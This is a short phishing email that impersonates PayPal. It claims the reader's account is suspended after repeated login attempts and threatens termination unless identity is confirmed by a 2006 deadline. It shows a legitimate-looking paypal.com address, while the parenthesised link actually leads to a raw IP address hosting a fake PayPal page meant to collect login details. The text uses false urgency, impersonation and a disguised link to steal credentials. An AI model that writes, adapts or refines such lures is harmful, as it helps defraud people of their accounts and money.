 We recently determined that different multiple login attempts have been made on your PayPal account. One employee of our Customer Service has tried to reach you by phone. As we did not manage to contact you, this email has been sent to your notice. Therefore your account has been temporary suspended. We need you to confirm your identity in order to regain full privileges of your account. If this is not completed by September 30, 2006, we reserve the right to terminate all privileges of your account indefinitely, as it may have been used for fraudulent purposes. In order to confirm your identity please follow the link below and complete the requested information: http://www.paypal.com/webscr?cmd=LogIn (http://62.167.10.183:16080/paypal.com/) Thank you for your support in this matter.
